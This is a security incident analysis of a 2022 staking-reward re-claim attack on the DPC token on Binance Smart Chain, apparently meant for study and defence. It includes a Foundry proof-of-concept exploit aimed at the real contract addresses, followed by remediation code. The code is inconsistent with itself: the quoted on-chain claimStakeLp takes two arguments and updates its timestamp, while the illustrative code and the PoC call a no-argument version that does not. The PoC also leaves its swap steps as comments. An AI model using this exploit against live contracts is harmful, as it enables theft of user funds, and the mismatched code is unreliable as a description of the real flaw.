# DPC — Staking Reward Re-Claim Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | DPC Token Staking |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **Vulnerable Contract (DPC Token)** | [0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE](https://bscscan.com/address/0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE) |
| **LP Pair** | [0x79cD24Ed4524373aF6e047556018b1440CF04be3](https://bscscan.com/address/0x79cD24Ed4524373aF6e047556018b1440CF04be3) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | No reward amount validation on repeated `claimStakeLp()` calls |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/DPC_exp.sol) |

---
## 1. Vulnerability Overview

The DPC token staking protocol allows users to stake LP tokens and claim rewards via `claimStakeLp()`. The attacker purchased USDT with a small amount of WBNB, composed a USDT-DPC LP position, and staked it. They then called `claimStakeLp()` 9 times in succession, exploiting a gap in the staking reward validation logic to extract an excessive amount of DPC. Notably, the airdrop mechanism was also abused via a `tokenAirdrop(100)` call.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable claimStakeLp() - no protection against repeated claims
function claimStakeLp() external {
    uint256 userStake = stakedBalance[msg.sender];

    // ❌ Only calculates time elapsed since last claim
    // but can be called repeatedly within the same block/transaction
    uint256 reward = calculateReward(userStake, lastClaimTime[msg.sender]);

    // ❌ lastClaimTime is not updated, or updated incompletely
    // reward should become 0 but is recalculated fresh each time
    dpcToken.transfer(msg.sender, reward);
}

// ❌ tokenAirdrop() - no upper bound on airdrop amount
function tokenAirdrop(uint256 amount) external {
    // ❌ No validation of amount, callable repeatedly
    require(balanceOf(msg.sender) >= amount, "Insufficient balance");
    // Airdrop logic executes → additional DPC minted/distributed
    _mint(msg.sender, amount * multiplier);
}

// ✅ Correct pattern - state update immediately after claim
mapping(address => uint256) public lastClaimBlock;

function claimStakeLp() external {
    require(block.number > lastClaimBlock[msg.sender], "Already claimed this block");
    uint256 userStake = stakedBalance[msg.sender];
    uint256 reward = calculateReward(userStake, lastClaimTime[msg.sender]);

    lastClaimTime[msg.sender] = block.timestamp; // ✅ Immediate update
    lastClaimBlock[msg.sender] = block.number;   // ✅ Per-block restriction

    dpcToken.transfer(msg.sender, reward);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**DPC.sol** — Entry point:
```solidity
// ❌ Root cause: no reward amount validation on repeated `claimStakeLp()` calls
        function claimStakeLp(address _from ,uint256 Amountwei) public {  // ❌ Vulnerability
                require(Amountwei > 0,"Quantity error");
                require(_from==msg.sender,"error");
                require(dpcLp[_from] >= Amountwei ,"Insufficient authorization limit");
                IERC20(LpContract).transfer(_from,Amountwei);

                oldClaimQuota[_from] = oldClaimQuota[_from].add(getClaimQuota(_from));

                dpcLp[_from] = dpcLp[_from].sub(Amountwei);

                time=currTimeStamp();
                dpcLpTime[_from] = time;

                dpcLpTotal = dpcLpTotal.sub(Amountwei);
        
         }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 2 WBNB → USDT swap (PancakeRouter)
    │
    ├─[2] Half of USDT → DPC swap
    │
    ├─[3] Call tokenAirdrop(100)
    │       └─ Additional DPC acquired
    │
    ├─[4] Add liquidity with USDT + DPC
    │       └─ Receive LP tokens
    │
    ├─[5] Call stakeLp(lpBalance)
    │       └─ Stake LP tokens
    │
    ├─[6] claimStakeLp() × 9 repeated calls
    │       └─ DPC reward claimed successfully on each call
    │           ❌ Already-claimed rewards can be re-claimed
    │
    ├─[7] Call claimDpcAirdrop()
    │       └─ Receive additional airdrop DPC
    │
    └─[8] Accumulated DPC → WBNB reverse swap
              Profit realized
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDPC {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function tokenAirdrop(uint256 amount) external;
    function stakeLp(uint256 amount) external;
    function claimStakeLp() external;
    function claimDpcAirdrop() external;
}

interface IPair {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract DPCExploit is Test {
    IDPC dpc = IDPC(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE);
    IPair pair = IPair(0x79cD24Ed4524373aF6e047556018b1440CF04be3);

    function setUp() public {
        vm.createSelectFork("bsc", 21_179_209);
        vm.deal(address(this), 2 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", address(this).balance, 18);

        // [Step 1] WBNB → USDT → DPC swap
        // (via PancakeRouter)

        // [Step 2] Trigger airdrop
        dpc.tokenAirdrop(100); // ⚡ No validation on airdrop amount

        // [Step 3] Compose LP and stake
        uint256 lpBal = pair.balanceOf(address(this));
        pair.approve(address(dpc), lpBal);
        dpc.stakeLp(lpBal);

        // [Step 4] Repeat claimStakeLp() 9 times
        // ⚡ No re-claim prevention logic
        for (uint256 i = 0; i < 9; i++) {
            dpc.claimStakeLp();
        }

        // [Step 5] Claim additional airdrop
        dpc.claimDpcAirdrop();

        // [Step 6] DPC → WBNB reverse swap
        // (via PancakeRouter)

        emit log_named_decimal_uint("[End] WBNB balance", address(this).balance, 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Staking Reward Re-Claim |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Staking Reward Calculation Manipulation |
| **Attack Vector** | Duplicate reward collection via repeated `claimStakeLp()` calls |
| **Precondition** | LP staking completed |
| **Impact** | Excessive DPC token withdrawal |

---
## 6. Remediation Recommendations

1. **Apply claim cooldown**: Require a minimum of N blocks or N seconds to elapse since the last claim before allowing a re-claim.
2. **Apply CEI pattern**: State updates (`lastClaimTime`) must be performed before external calls (`transfer`).
3. **Track cumulative rewards**: Record accumulated rewards and compare against already-claimed amounts to prevent duplicate claims.

```solidity
// ✅ Safe claimStakeLp() - CEI pattern + cooldown
mapping(address => uint256) public lastClaimTime;
uint256 public constant CLAIM_COOLDOWN = 1 days;

function claimStakeLp() external nonReentrant {
    require(
        block.timestamp >= lastClaimTime[msg.sender] + CLAIM_COOLDOWN,
        "Claim cooldown active"
    );

    uint256 userStake = stakedBalance[msg.sender];
    uint256 reward = calculateReward(userStake, lastClaimTime[msg.sender]);

    // ✅ Checks-Effects-Interactions: update state first
    lastClaimTime[msg.sender] = block.timestamp;
    pendingRewards[msg.sender] = 0;

    // Transfer after
    require(reward > 0, "No reward");
    dpcToken.transfer(msg.sender, reward);
}
```

---
## 7. Lessons Learned

- **Idempotency of staking reward claims**: The system must be designed so that multiple calls with the same state do not produce different results. `claimStakeLp()` must update state immediately so that the same reward is not recalculated on each invocation.
- **Airdrop and staking coupling**: When an airdrop mechanism is coupled with a staking system, both systems must be independently reviewed for exploitability.
- **Repeated-call testing**: All reward claim functions must be tested for repeated-call scenarios within the same transaction.